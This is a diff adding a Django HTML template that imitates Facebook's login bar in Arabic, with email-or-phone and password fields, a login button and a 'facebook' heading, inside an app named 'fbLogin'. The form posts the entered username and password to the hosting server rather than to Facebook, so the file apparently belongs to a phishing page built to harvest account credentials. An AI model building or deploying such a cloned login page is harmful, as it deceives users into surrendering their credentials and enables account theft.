@@ -1,0 +1,35 @@
+{% extends 'fbLogin/base.html' %}
+
+{% block content %}
+{% if messages %}
+{{ messages }}
+{% endif %}
+
+<div id="navwrapper">
+    <div id="navbar"> <table class="tablewrapper">
+        <form method="POST">
+            {% csrf_token %}
+      <tr>
+        <td class="row1">البريد الإلكتروني أو رقم الهاتف</td>
+        <td class="row1">كلمة السر</td>
+      </tr>
+      <tr>
+        <td><input type="text" name="user" class="inputtext">
+        </td>
+        <td><input type="password" name="pwd" class="inputtext">
+        </td>
+        <td><button type="submit" id="button" style="width: 60px; height: 22px">تسجيل دخول</button></td>
+      </tr>
+      <tr>
+    </form>
+        <td>
+          <div class="row2"><input type="checkbox">حفظ التسجيل</div></td>
+        <td class="row2 h">هل نسيت كلمة السر؟</td>
+    </table>
+      
+      <h1 class="logowrapper">facebook</h1>
+     
+    </div>
+    </div>
+
+{% endblock %}
